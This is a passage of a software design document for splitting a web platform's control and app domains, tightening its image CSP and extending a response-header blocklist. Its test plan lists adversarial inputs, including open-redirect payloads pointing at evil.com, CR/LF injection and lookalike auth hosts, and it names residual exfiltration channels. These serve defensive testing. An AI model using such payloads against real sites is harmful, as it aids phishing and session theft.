| `apps/edge/src/serving/assets.ts` | Send Report-Only header with the enforced one (`:114`) | Also covers the service-worker response (`app.ts:791`). |
| `apps/edge/src/serving/cspReport.ts` | Count reports with a bounded `directive` dimension | See Telemetry. Do not log blocked URLs. |
| `packages/shared/src/telemetry.ts`, `apps/edge/src/telemetry.ts` | New instrument constants and entries on `instruments()` | See Telemetry. |
| `packages/shared/src/fetch.ts` | Add `clear-site-data`, `content-security-policy`, `content-security-policy-report-only`, `refresh`, `report-to`, `reporting-endpoints`, `nel`, `link` to `RESPONSE_HEADER_BLOCKLIST` (`:110`) | Part 3. Affects egress and the edge gateway. |
| `packages/shared/src/capabilityHelp.ts` | Update the `externalOrigins` copy (`:61-70`): "also allows images from this host; anything the page can read can be sent there" | The classifier is unchanged (`approval.ts:406-410`) unless 2C is chosen. |
| `apps/portal/src/deployment.ts` | Add `resolveControlPublicBase()` (optional, defaults to `APP_PUBLIC_BASE`'s origin); `connectionsCallbackUrl()` uses it; validate in `assertDeploymentConfig` | Replaces the "derived, never configured" comment (`:66-68`) with the new rule and the reason. |
| `apps/portal/src/deployment.test.ts`, `routes/config.test.ts`, `routes/apps.test.ts` | New cases for split config | See Tests. |
| `infra/azure/main.bicep` | New params `hostedAppsDomain`, `hostedAppsTlsBound`; derived `appHostsDomain`; edge env, dev-gateway env, portal env as above; edge `customDomains` gets a second entry; second `dns` and `certbot` module instances | `:55, 886-902, 1120-1144, 1197, 1272, 1334-1339, 1396, 1433, 1468-1500`. |
| `infra/azure/modules/dns.bicep` | `hostsControlPlane` bool; apps zone gets only `*` and `asuid` | `:31-97`. |
| `infra/azure/modules/certbot.bicep` | No change expected; confirm it can be instantiated twice (names are prefixed by `namePrefix`, so the second instance needs a distinct name suffix) | `:75-91, 178-192`. **Hypothesis:** the job, identity and role names collide if `namePrefix` is reused; I did not open the whole module. |
| `apps/certbot/issue-and-bind.sh` | None | Parameterised already. Document running it per domain. |
| `infra/entra/main.bicepparam`, `infra/entra/README.md` | None for installs that keep the auth host. Document that a new install's `edgeRedirectUris` uses its control domain | `:12-13`. |
| `.devcontainer/docker-compose.yml`, `.devcontainer/post-create.sh`, `scripts/stack-env.mjs`, `.claude/skills/run-helix/smoke.mjs`, `.github/workflows/ci.yml` | Second loopback dev domain via `HELIX_APPS_DOMAIN`, second mkcert cert, Node/browser resolution of `*.helix-apps.localhost`, split-mode smoke run; pass `EDGE_CONTROL_DOMAIN` through stack env | Single-domain dev stays the default. `ci.yml` is edited for consistency only; CI stays off. |
| `apps/connections-lane/src/world.ts` | Parameterise `AUTH_HOST` over a control domain | `:74`. |
| `packages/deploy-skill/SKILL.md`, `apps/docs/src/apps/quickstart.md`, `docs/features/edge-serving.md` | Update the published CSP block (`SKILL.md:49, 59, 160`; `quickstart.md:56, 66, 167`; `edge-serving.md:135-139`). Tell agents: inline images as `data:` URIs or ship them in the bundle; remote images need an approved origin | This is the main compatibility lever. |
| `SECURITY.md` | Replace the "known gaps" text at `:56-57, 96` with the post-change residual | Say plainly: after Part 2, app code can still send out what its viewer can read through navigation. |
| `docs/features/authentication.md`, `apps/edge/README.md`, `docs/features/observability.md`, `infra/azure/README.md`, `apps/docs/src/deploy/configuration.md`, `getting-started.md` | Document `EDGE_CONTROL_DOMAIN`, `hostedAppsDomain`, `CONTROL_PUBLIC_BASE`, `EDGE_LEGACY_APP_REDIRECT`, `EDGE_IMG_SRC_EXTRA`, the two-cert layout and the new metrics | Edge README env table at `apps/edge/README.md:63`. |
| `docs/adr/0019`, `0028`, `0009`, `0044` | See ADR impact (one combined 0019/0028 amendment) | |

## Failure paths

- **Bad domain config.** Identical domains are legacy mode. A control domain that is a subdomain of the apps domain, or an invalid hostname, fails the boot with a clear error. Fail closed: the edge does not start with a topology that would let an app reach the auth host's cookie scope.
- **`EDGE_CONTROL_DOMAIN` unset or blank.** Falls back to `baseDomain`. That is today's layout, so the failure direction is "no containment gain", not "broken login".
- **Edge and portal disagree.** The portal builds the vendor callback from `CONTROL_PUBLIC_BASE`; the edge serves it from `EDGE_CONTROL_DOMAIN`. Both come from the same Bicep parameter. If someone sets only one, the OAuth callback fails at the vendor (redirect mismatch) rather than leaking anything. The OIDC login redirect URI is built only from edge config, so SSO does not depend on the portal value. Add a runbook check (the callback URL is visible in the provider payload).
- **Second cert missing or bound to the wrong name.** With `hostedAppsTlsBound=false`, the edge has no declared binding for the apps domain and the certbot job binds at runtime (the ADR-0044 bootstrap path). With the gate on and no cert, the app PUT fails loudly at deploy, not silently at runtime.
- **Apps on the new domain before DNS or cert exist.** TLS fails in the browser. The old URLs keep working because the control wildcard is still bound. This is why the order in Rollout puts DNS and certs first and the portal's `APP_PUBLIC_BASE` flip last.
- **Cross-site cookie handling in a browser.** If a browser's tracking protection breaks the handoff, the symptom is a login loop at `/start`. Existing counters cover it: the gate-denied counter (`INSTR_SESSION_GATE_DENIED`) and the span for `helix.auth.handoff.complete` would show redemption failures. Verify before cutover (see Rollout).
- **Legacy redirect.** Registry not loaded → treated as an unknown host (404), not a redirect. Archived or unknown slug → 404. Disabled → 404. A redirect target is never taken from the request.
- **Report-Only header.** A malformed Report-Only policy is ignored by browsers. It cannot break a page. The enforced policy is a separate header.
- **Enforced tight `img-src`.** Images fail to load and a violation is recorded. The page itself keeps working. The grant path restores them after approval. The approval write-gate and the registry projection are unchanged, so a registry outage keeps serving the last committed CSP.
- **`csp_reports` insert fails.** `cspReport.ts` already logs a warning and answers 204. The new counter increments before the insert, so telemetry still works.
- **Report flood.** A tightened `img-src` can multiply reports. `cspReport.ts` has no rate limit today (**Hypothesis**: I did not find one in the file). A hostile app can already flood it. Add an in-handler cap per app per window if the measurement phase shows load (open question).

## Tests

All checks run locally (V1). `./check-and-lint.sh` / `just check` covers unit and integration tests. The smoke runner covers running services. Nothing here is proven in Azure.

**Part 1 adversarial tests (the auth path).** Per AGENTS.md these ship in the same change as the domain split (CT-5), and the change gets the dedicated review pass. Existing cases are parameterised over both layouts and must pass unmodified in single-domain mode. The named adversarial tests:

1. **Auth-host impersonation.** In split mode `auth.<appsDomain>` classifies as `platform`, never `auth`. `/start` and `/callback` on it return 404, not the OIDC flow (`routing/hosts.test.ts`, `auth/adversarial.test.ts`). The same for `portal.<appsDomain>` and `dev-api.<appsDomain>`.
2. **Lookalike hosts.** `xauth.<controlDomain>`, `auth.<controlDomain>.evil.com`, `auth.<controlDomain>:port` variants, an absent Host, an IPv6 literal and uppercase/trailing-dot hosts are `platform` or refused.
3. **Cross-domain handoff replay.** A handoff token redeemed a second time gets 403 and sets no cookie. The token minted for app B is refused on app A (audience confusion). Attacker-preset cookies on the app host do not survive redemption (fixation). All three hold with the two hosts on different registrable domains.
4. **Cookie scope across domains.** A `__Host-session` minted on one app host does not authenticate on another host or on the control host (the test sends it to the wrong host and asserts a redirect, not a session). The flow cookie is accepted only on the auth host. An app response setting `Domain=<appsDomain>` or `Domain=<controlDomain>` never produces a cookie the control hosts receive (browser check in the smoke runner).
5. **Origin and Fetch Metadata.** A request to an app host with `Origin: https://auth.<controlDomain>` or `https://<other-slug>.<appsDomain>` is refused. `Sec-Fetch-Site: cross-site` is refused where `same-site` is refused today (`adversarial.test.ts:571` covers only the sibling-subdomain shape).
6. **Open redirect.** The `rd` corpus (`//evil.com`, `/\evil.com`, CR/LF, userinfo in Host, a scheme-relative target) against the handoff and the legacy redirect target. The target host always comes from config.
7. **Unmigrated call site.** `publicOrigin(config, "auth")` (or any reserved label) throws, so a missed call site fails in tests instead of emitting `auth.<appsDomain>`.
8. **Boot validation.** A control domain that is a subdomain of the apps domain, an invalid hostname, and identical domains behave as specified. A parent/child pair in the other direction boots and logs `split: true` (the PSL requirement is documentation, not a check).
9. **Concurrent redeem race and `prompt=none`** in `auth/flow.integration.test.ts` with `EDGE_CONTROL_DOMAIN` different from `EDGE_BASE_DOMAIN`, against the ephemeral dev-idp.
10. **Edge and portal disagreement.** With only one of `EDGE_CONTROL_DOMAIN` / `CONTROL_PUBLIC_BASE` set, the portal's boot check fails or the callback fails closed at the vendor. Nothing leaks (`apps/portal/src/deployment.test.ts`).

Other files extended: `apps/edge/src/auth/handoff.test.ts`, `flow.test.ts`, `gate.test.ts` (redirect `Location` uses the control origin for `/start` and the apps origin for `/_auth/complete`); `config.test.ts` (default, split, rejects, `publicOrigin` throws; pattern at `:662-667`); `routing/connectionsProxy.test.ts`, `consentStart.test.ts`, `connectionsJourney.integration.test.ts` (callback URL, popup URL and `platformOrigins` use the control origin; the consent journey completes with a cross-site opener); `apps/edge/src/test/config.ts` (new `splitEdgeConfig()` and `splitDevGatewayConfig()`); `apps/portal/src/deployment.test.ts`, `routes/config.test.ts` (callback URL with and without `CONTROL_PUBLIC_BASE`, invalid value throws at boot, `appPublicBase` follows `APP_PUBLIC_BASE` only, app URL and callback URL on different registrable domains in split mode).

**Legacy redirect tests (CT-8).** GET/HEAD only; never `_`-prefixed paths; unknown, archived and disabled slugs get 404; registry-not-loaded gives 404; target host from config; path through `validateReturnPath`; `no-store` cache header.

**Smoke runner in split mode (CT-7).** With `HELIX_APPS_DOMAIN=helix-apps.localhost`, `node .claude/skills/run-helix/smoke.mjs` logs in through the IdP, lands on `<slug>.helix-apps.localhost`, reads `Sec-Fetch-Site` on the handoff and `/_api` calls and records the value, completes a connections consent popup, and exercises silent refresh. Single-domain mode passes unchanged.

**Part 2 tests**

- `apps/edge/src/serving/csp.test.ts`: replace "keeps img-src open" (`:36-39`) with `img-src` pinned to `'self' data: blob:` exactly; approved origins and `EDGE_IMG_SRC_EXTRA` widen `img-src`; `EDGE_IMG_SRC_ALLOW_ALL=true` restores `https:`; `object-src 'none'` is pinned; malformed origins are dropped; `https:`, `*` and `http:` never appear in `img-src` by construction when the knob is off; the Report-Only variant differs only where intended.
- `apps/edge/src/serving/cspReport.test.ts`: the counter increments with a bounded directive value; an unknown or hostile directive string is folded into `other`.
- `apps/edge/src/app.test.ts` / serving tests: both headers present on HTML, asset and service-worker responses during the Report-Only phase; only the enforced header after CT-3.
- `apps/portal/src/db/mappers` tests: `isResolved` for `img-src` with an approved origin.
- `packages/shared/src/approval.test.ts`: adding an origin is still elevated.
- Smoke runner: a tight-CSP page loads a granted image and blocks an ungranted one; the connections consent popup completes under the tightened CSP.

**Part 3 tests**

- `packages/shared` blocklist test: every new name is in `RESPONSE_HEADER_BLOCKLIST`. Each is stripped by egress (`apps/egress/src/proxy.test.ts`) and by the edge gateway (`apps/edge/src/gateway/fetch` tests), and the existing allowed headers (`etag`, `content-type`, `retry-after`) still pass.

**Bicep:** `just infra build` compiles with and without `hostedAppsDomain`. Single-domain output must be identical to today's for an install that sets nothing. Anything about ACA wildcard bindings, certificates and DNS delegation is **unverified in Azure**.

## Telemetry

New signals, each in `packages/shared/src/telemetry.ts` with constants, on the edge's `instruments()` object (`apps/edge/src/telemetry.ts:95-135`):

- **`INSTR_CSP_REPORTS`** (`helix.edge.csp_reports`): counter of CSP violation reports received. Dimensions: `appId` (bounded, allowed) and `directive`, restricted to a fixed set of directive names (`img-src`, `connect-src`, `script-src`, `style-src`, `font-src`, `object-src`, `other`). Not the blocked URI, not the document URI. Add a `disposition` dimension (`enforce`/`report`) if the report body carries it (**Hypothesis**: the legacy `report-uri` body has a `disposition` field in current Chrome; check before relying on it), so the Report-Only phase can be separated from enforcement. Operational only; the owner-facing counts stay in `csp_reports`.
- **`INSTR_LEGACY_APP_REDIRECTS`** (`helix.edge.legacy_app_redirects`): counter with `ATTR_OUTCOME` in {`redirected`, `unknown_app`, `refused_path`}. No host, path or slug. This is the sunset signal: when it reaches zero, turn the redirect off.
- A route constant for the redirect branch if it is wrapped in `spanRoute`. Its attributes must be `http.route` and `appId` only, with no URL.
- A `boot.serving` log field `split` and the two domains (a log, not a span attribute).

Do not add `host`, `slug` or any URL as a metric dimension. Telemetry names are constants, never literals.

Extend the adversarial telemetry suites rather than routing around them:

- `apps/edge/src/spanRedaction.test.ts`: scans every attribute on every span. Add a legacy-redirect request carrying `?token=…` and assert that nothing contains the query, host or slug. Add a CSP-report request whose `blocked-uri` carries a secret-looking value.
- `apps/edge/src/traceBoundary.test.ts`: the new redirect and report paths must not continue an inbound `traceparent`.
- `apps/edge/src/auth/gateTelemetry.test.ts`: the denial counter still has the same bounded reasons in split mode.
- `apps/egress/src/spanAttributes.test.ts` is touched only if Part 3 adds anything to egress spans. It does not.
- Update the span and instrument tables in `docs/features/observability.md`, and its alert section (`:321-333`) if a 431 alert or a CSP-report alert is added.

Alerts worth adding after measurement: 431 rate on the control hosts (SEC-1's stopgap while a install is still on one domain), and a spike in `img-src` reports to non-granted origins on a single app (a detection signal for attempted exfil).

## Rollout and migration

Nothing is rolled out to the live installs by this work (D2 revised). The steps below are **operator rollout notes**: what the operator of an existing install does, in order, after taking a release that contains these changes. Everything the notes say about Azure is **unverified in Azure**.

### Operator rollout notes: Part 3 (headers)

1. Deploy the new egress and edge images. No setting is involved.
2. If an app's upstream vendor legitimately relied on one of the stripped headers reaching the app (unlikely; they cannot act on a `fetch()` response), the blocklist is the single source (`packages/shared/src/fetch.ts`).

### Operator rollout notes: Part 2 (CSP)

1. Deploy the Report-Only release. The enforced policy is unchanged. `csp_reports` and `helix.edge.csp_reports` start recording `img-src` and `object-src` reports with `disposition`.
2. Watch the Violations screen and the counter for the measurement window. Pre-grant legitimate hosts through the normal approval request, or list hosts you trust everywhere in `EDGE_IMG_SRC_EXTRA` (never an image proxy that fetches attacker-chosen URLs).
3. Deploy the enforcing release. Installs on the one-org model who do not want the change set `EDGE_IMG_SRC_ALLOW_ALL=true`.
4. Tell app owners: inline images as `data:` URIs or ship them in the bundle; remote images need an approved origin.

### Operator rollout notes: Part 1 (domain split)

For a new install:

1. Pick two registrable domains (or a delegated subdomain you will PSL-list; without a PSL entry the two are same-site and the cookie-bomb protection is lost). Create and delegate both zones.
2. Set `appsDomain` (control) and `hostedAppsDomain` (apps) in the `.bicepparam`. Deploy with `wildcardTlsBound` and `hostedAppsTlsBound` false.
3. Run the first certbot job instance, then the second. Flip both bound flags and redeploy. The what-if canary from ADR-0044 must never show `Delete properties.configuration.ingress.customDomains` for either binding.
4. If the install uses the firewall tier, add the ACME, ARM and Graph hosts to the apps-subnet list before the second certbot run (cross-design dependency with 03-egress-network-control; **Hypothesis** that they are missing today).
5. Register the Entra redirect URIs for the control domain, as today.
6. Submit the apps zone to the PSL.

For an existing install that keeps its current domain as the control domain (auth, portal, dev-api, Entra and vendor callbacks do not change; only app URLs move):

1. Deploy the new edge and portal images with all new settings absent. This must be a no-op; confirm before changing anything else.
2. Choose and delegate the apps domain. Add the apps zone and its `asuid` TXT.
3. Add the second certbot instance, run it to issue `*.<apps domain>`, flip `hostedAppsTlsBound`.
4. On a staging app, verify the cross-site login in Chrome, Firefox and Safari. This is the check local testing cannot do.
5. Set `EDGE_LEGACY_APP_REDIRECT`, `EDGE_BASE_DOMAIN` and the Bicep `hostedAppsDomain`. In the same release set `APP_PUBLIC_BASE` and `CONTROL_PUBLIC_BASE` on the portal. The edge and portal flips must land together. New deploys and the CLI then print the new URLs, because they come from the portal.
6. Tell app owners their URLs changed. Update links, the `availabilityExtraTargets` list (it holds app URLs, `main.bicep:326`), and any app registered with an external service by its old host.
7. Watch `INSTR_LEGACY_APP_REDIRECTS`. When it is near zero for a chosen period, turn the redirect off and delete the control wildcard DNS record and its cert binding. Keep `auth`, `portal` and `dev-api` records.

**Data migration:** none. Apps are keyed by slug and app id. Sessions are keyed by app id and host-only cookies, so existing sessions on old hosts are lost and users sign in again. Handoff tokens in flight at the moment of the cutover fail and restart.

**Compatibility breaks:** app URLs change (the redirect softens it for GET navigations only); any cookie or localStorage on the old origin is not carried over, because origins differ. Apps that stored per-user state in browser storage lose it. Apps whose `/_api` clients hardcoded the old host (they should use relative URLs) break.

**Dev environment:** single-domain dev stays the default. `HELIX_APPS_DOMAIN` switches it to split mode (see the loopback section). Unit and integration tests set `Host` headers directly and need no DNS.

## ADR impact

- **ADR-0019 and ADR-0028 (one combined amendment, per review.md dependency 2).** Record that the per-install split is implemented: `EDGE_CONTROL_DOMAIN`, the classification rule, the optional redirect, the PSL recommendation, and that `auth.<appsDomain>` is never an auth host. Decision 1: `EDGE_BASE_DOMAIN` remains the app domain, with the control domain a second setting. The 03 design adds that the egress allow-list is per-install configuration; write both in the one amendment.
- **ADR-0009:** amend the "Decision" and "Open question" sections: `img-src` is no longer open; `object-src 'none'` is added; the CDN list is unchanged and why; the residual channels are listed (navigation, popups, approved origins, WebRTC, DNS hints). Keep the existing warning not to add a hash or nonce to `script-src`.
- **ADR-0044:** note that cert names and bindings are now one pair per domain, with a second gate parameter.
- **New ADR (optional):** "Control and app domains", only if the owner wants the portal's `CONTROL_PUBLIC_BASE` rule recorded separately. It would say the portal receives the control origin by configuration, not derivation; the edge and portal must be set from one Bicep parameter; and a mismatch fails at the vendor callback, never open. Number assigned when written.
- **ADR-0035:** no change. The CSP still has `unsafe-inline` and still governs the platform service worker, and the Report-Only header is served on that response too.
- **ADR-0021, 0037:** no change. The new metrics are operational and do not touch the ledger.

## Open questions

The decisions answered the audience, domain, image-breakage, redirect, dev-domain and CDN questions. What remains:

1. **ACA wildcard limits (unverified in Azure).** Does Azure Container Apps allow two wildcard custom domains on different certs on one container app? Nothing local can answer this. If it does not, the two-cert layout needs a different binding design. The operator finds out in step 3 of the new-install notes. _Recommended:_ ship the Bicep as compile-checked and label it unverified.
2. **Certbot double instantiation (unverified).** Do job, identity and role names collide when `namePrefix` is reused (`certbot.bicep:75-91, 178-192`)? CT-9 settles this by reading the whole module and compile-checking two instances.
3. **Report flood.** `cspReport.ts` has no rate limit (**Hypothesis**; not found in the file). Add a per-app cap only if the Report-Only phase shows load. _Recommended:_ defer, and watch `helix.edge.csp_reports`.
4. **`.localhost` site classification.** Whether each browser treats `a.localhost` and `b.localhost` as cross-site is a Hypothesis, checked in CT-7 by reading `Sec-Fetch-Site`. If it fails, split-domain browser tests fall back to the same-site pair and the cross-site claim stays unverified.

## Work breakdown

Changes in the order they should land. Each fits one pull request. Part 3 first, CSP as Report-Only next, then enforcement, and the domain split last because it touches the OIDC handoff. All verification is local (V1, V4): `./check-and-lint.sh` / `just check` in the dev container, plus the smoke runner (`node .claude/skills/run-helix/smoke.mjs`, also `just dev smoke`) where running services change.

### CT-1 Extend the proxied-response header blocklist
- **Depends on:** none
- **Files:** `packages/shared/src/fetch.ts` (`RESPONSE_HEADER_BLOCKLIST`, `:110-122`), blocklist test in `packages/shared`, `apps/egress/src/proxy.test.ts`, `apps/edge/src/gateway/fetch` tests
- **Done when:** `clear-site-data`, `content-security-policy`, `content-security-policy-report-only`, `refresh`, `report-to`, `reporting-endpoints`, `nel` and `link` are in the blocklist; none of them reaches an app-origin response through egress or the edge gateway; `etag`, `content-type`, `retry-after` and rate-limit headers still pass.
- **Evidence:** the blocklist unit test; one egress and one edge-gateway test per new header asserting the header is stripped from an upstream response that carries it; `./check-and-lint.sh` green. Nothing in this change is Azure-specific.

### CT-2 Report-Only tightened CSP and the report counter
- **Depends on:** CT-1 (order only; no code dependency)
- **Files:** `apps/edge/src/serving/csp.ts` (Report-Only builder, `EDGE_IMG_SRC_EXTRA`, `object-src 'none'`), `apps/edge/src/serving/assets.ts` (`:114`), `apps/edge/src/app.ts` (`:791`), `apps/edge/src/config.ts`, `apps/edge/src/serving/cspReport.ts`, `packages/shared/src/telemetry.ts`, `apps/edge/src/telemetry.ts`, `packages/shared/src/capabilityHelp.ts`, `packages/deploy-skill/SKILL.md`, `apps/docs/src/apps/quickstart.md`, `docs/features/edge-serving.md`, `docs/features/observability.md`, `apps/edge/README.md`
- **Done when:** HTML, asset and service-worker responses carry the unchanged enforced `Content-Security-Policy` and a `Content-Security-Policy-Report-Only` header with `img-src 'self' data: blob:` plus approved origins plus `EDGE_IMG_SRC_EXTRA`, and `object-src 'none'`; reports from it land in `csp_reports`; `INSTR_CSP_REPORTS` counts them with a bounded `directive` dimension (and `disposition` if the report body carries it); the approval copy says an approved host is also an image sink; the skill and docs tell agents to inline images as `data:` URIs or ship them in the bundle.
- **Evidence:** `csp.test.ts`, `cspReport.test.ts`, serving tests for both headers on all three response kinds, `spanRedaction.test.ts` case with a secret-looking `blocked-uri`, `traceBoundary.test.ts`; smoke runner shows a page with a remote image producing a recorded `img-src` report while the image still loads. Browser delivery of the legacy `report-uri` `disposition` field is a **Hypothesis** until read from a real report in the smoke run.

### CT-3 Enforce the tighter img-src and object-src
- **Depends on:** CT-2
- **Files:** `apps/edge/src/serving/csp.ts`, `apps/edge/src/config.ts` (`EDGE_IMG_SRC_ALLOW_ALL`), `apps/edge/src/serving/csp.test.ts`, `SECURITY.md` (`:56-57, 96`), `docs/adr/0009`, `apps/docs/src/deploy/configuration.md`
- **Done when:** the enforced header carries `img-src 'self' data: blob:` plus approved origins plus `EDGE_IMG_SRC_EXTRA`, and `object-src 'none'`; `EDGE_IMG_SRC_ALLOW_ALL=true` restores `https:` and suppresses the Report-Only duplicate; an ungranted remote image is blocked and produces a violation that the Violations screen can resolve by granting the origin; the connections consent popup still works; SECURITY.md and ADR-0009 state the residual channels (navigation, popups, approved origins, WebRTC, DNS hints) and that confidentiality is not delivered.
- **Evidence:** updated `csp.test.ts` (exact `img-src`, no `https:`/`*`/`http:` when the knob is off, knob on restores `https:`), `isResolved` mapper test, smoke runner granted-image and blocked-image check plus consent popup under the tightened policy, `./check-and-lint.sh`. WebRTC and DNS-hint claims remain **Hypothesis**; stated as untested in the docs.

### CT-4 Second loopback domain in the dev environment (no behavior change)
- **Depends on:** none (lands after CT-3 to keep the order)
- **Files:** `.devcontainer/docker-compose.yml`, `.devcontainer/post-create.sh`, `scripts/stack-env.mjs`, `.claude/skills/run-helix/smoke.mjs` (resolution helpers only), `.devcontainer` docs
- **Done when:** with `HELIX_APPS_DOMAIN` unset, the dev stack and smoke runner behave exactly as before; with it set to `helix-apps.localhost`, a second mkcert cert (`local-helix-split.pem`) with the four SANs exists, compose selects it, `stack-env.mjs` exposes both domains, and the smoke runner's Node client and browser resolve `*.helix-apps.localhost` to 127.0.0.1 without relying on `getaddrinfo`.
- **Evidence:** `just dev smoke` unchanged in single-domain mode; a check that the TLS handshake to `https://x.helix-apps.localhost:8080` presents the split cert and a browser accepts it (mkcert and Chromium handling of `*.helix-apps.localhost` is a **Hypothesis** until run). Not Azure-related.

### CT-5 Edge control/apps domain split with adversarial tests
- **Depends on:** CT-4
- **Files:** `apps/edge/src/config.ts` (`controlDomain`, `EDGE_CONTROL_DOMAIN`, `controlOrigin()`, reserved-label guard, boot validation), `apps/edge/src/routing/hosts.ts`, `apps/edge/src/app.ts` (`:372`), the eight auth-host call sites (`server.ts`, `auth/gate.ts`, `auth/routes/authHost.ts`, `auth/routes/passwordLogin.ts`, `routing/consentStart.ts`, `devGateway/consentStart.ts`, `serving/assets.ts`), `apps/edge/src/devGateway/server.ts`, `apps/edge/src/test/config.ts`
- **Done when:** with `EDGE_CONTROL_DOMAIN` unset every existing test passes unmodified; with it set, `auth.<controlDomain>` is the only auth host, `auth.<appsDomain>` is `platform`, redirect `Location`s use the control origin for `/start` and the apps origin for `/_auth/complete`, bad domain pairs fail the boot, and the dedicated adversarial review pass has happened.
- **Evidence:** the ten adversarial tests named in Tests: auth-host impersonation, lookalike hosts, cross-domain handoff replay / audience confusion / fixation, cookie scope across domains, Origin and Fetch Metadata, open-redirect corpus, unmigrated call site throws, boot validation, concurrent-redeem race with `prompt=none`, and edge/portal disagreement (the last completes in CT-6). Plus `hosts.test.ts`, `config.test.ts`, `handoff.test.ts`, `flow.test.ts`, `gate.test.ts`, `flow.integration.test.ts`, `gateTelemetry.test.ts` in split mode, `./check-and-lint.sh`. No Azure behavior involved.

### CT-6 Portal control origin
- **Depends on:** CT-5
- **Files:** `apps/portal/src/deployment.ts` (`resolveControlPublicBase()`, `connectionsCallbackUrl()`, `assertDeploymentConfig`, replace the comment at `:66-68`), `apps/portal/src/deployment.test.ts`, `apps/portal/src/routes/config.test.ts`, `apps/portal/src/routes/apps.test.ts`
- **Done when:** `CONTROL_PUBLIC_BASE` (optional, defaults to `APP_PUBLIC_BASE`'s origin) drives the vendor callback URL; an invalid value throws at boot; `appPublicBase` and app URLs still come only from `APP_PUBLIC_BASE`; a mismatch with the edge fails closed at the vendor, with a runbook check.
- **Evidence:** the portal unit tests listed in Tests, including app URL and callback URL on different registrable domains in split mode; `./check-and-lint.sh`.

### CT-7 Smoke runner in split mode and the connections lane
- **Depends on:** CT-5, CT-6
- **Files:** `.claude/skills/run-helix/smoke.mjs` (`:95, 468, 557`), `scripts/stack-env.mjs`, `apps/connections-lane/src/world.ts` (`:74`), `.devcontainer/docker-compose.yml`
- **Done when:** `HELIX_APPS_DOMAIN=helix-apps.localhost node .claude/skills/run-helix/smoke.mjs` logs in across the two domains, lands on the app host, completes silent refresh and a connections consent popup, records `Sec-Fetch-Site` values for the handoff and `/_api` calls, and proves an app-set cookie does not reach the control host; the same-site fallback pair runs the host-routing checks and shows the expected same-site result; single-domain mode passes unchanged.
- **Evidence:** the smoke runs in both modes. This is local only (V2). Safari ITP, Firefox ETP, Chrome bounce-tracking and real PSL behavior stay **unverified**; the browser engines are Playwright's, not Safari. `.localhost` cross-site classification is a **Hypothesis** that this run confirms or refutes.

### CT-8 Legacy redirect from old app hosts
- **Depends on:** CT-5
- **Files:** `apps/edge/src/config.ts` (`EDGE_LEGACY_APP_REDIRECT`), `apps/edge/src/routing/hosts.ts` (`legacy-app` kind), `apps/edge/src/app.ts` (catch-all, `:806-818`), `packages/shared/src/telemetry.ts`, `apps/edge/src/telemetry.ts`, `docs/features/observability.md`
- **Done when:** with the flag on, GET/HEAD to `<slug>.<controlDomain>` for a registered, enabled app gets a `307` with `no-store` to the same path on the apps origin; `_`-prefixed paths, other methods, unknown, archived and disabled slugs, and a not-loaded registry never redirect; flag off is today's 404; `INSTR_LEGACY_APP_REDIRECTS` counts `redirected`, `unknown_app` and `refused_path` with no host, path or slug.
- **Evidence:** the legacy-redirect tests in Tests; `spanRedaction.test.ts` with a `?token=` request, `traceBoundary.test.ts`; `./check-and-lint.sh`. Retirement of the redirect on a live install is an operator step, not verified here.

### CT-9 Bicep, DNS and certbot instances for the apps domain
- **Depends on:** CT-5, CT-6
- **Files:** `infra/azure/main.bicep` (`:55, 886-902, 1120-1144, 1197, 1272, 1334-1339, 1396, 1433, 1468-1500`), `infra/azure/modules/dns.bicep` (`hostsControlPlane`), `infra/azure/modules/certbot.bicep` (name collision check for a second instance), `apps/certbot` docs
- **Done when:** `hostedAppsDomain` (default `''`) and `hostedAppsTlsBound` exist; with them unset the compiled template is identical to today's; with them set the edge gets `EDGE_BASE_DOMAIN`/`EDGE_CONTROL_DOMAIN`, the portal gets `APP_PUBLIC_BASE`/`CONTROL_PUBLIC_BASE`, the edge gets two `customDomains`, the apps zone holds only `*` and `asuid`, and two certbot instances have distinct names; `issue-and-bind.sh` is unchanged.
- **Evidence:** `just infra build` with and without the parameters, and a diff of the compiled single-domain output against `main`. **Unverified in Azure:** ACA accepting two wildcard domains on different certs, certificate issuance and binding, the ADR-0044 what-if canary, DNS delegation, and certbot behind the firewall tier.

### CT-10 Documentation, ADR amendments and operator rollout notes
- **Depends on:** CT-5 to CT-9
- **Files:** `docs/features/authentication.md`, `docs/features/edge-serving.md`, `infra/azure/README.md`, `infra/entra/README.md`, `apps/docs/src/deploy/configuration.md`, `getting-started.md`, `apps/edge/README.md` (`:63`), `docs/adr/0019`, `0028`, `0009`, `0044`, `SECURITY.md`
- **Done when:** every new setting (`EDGE_CONTROL_DOMAIN`, `hostedAppsDomain`, `hostedAppsTlsBound`, `CONTROL_PUBLIC_BASE`, `EDGE_LEGACY_APP_REDIRECT`, `EDGE_IMG_SRC_EXTRA`, `EDGE_IMG_SRC_ALLOW_ALL`, `HELIX_APPS_DOMAIN`) is documented with its default and failure direction; the operator rollout notes from this design are published for each part, with the PSL requirement, the firewall-tier prerequisite and the cross-browser check marked as operator-run; ADR-0019 and ADR-0028 carry one combined amendment.
- **Evidence:** docs build or lint as the repo defines in `./check-and-lint.sh`; a read-through that no doc names a specific domain as required (C1). The browser and Azure claims in the notes are labeled unverified.
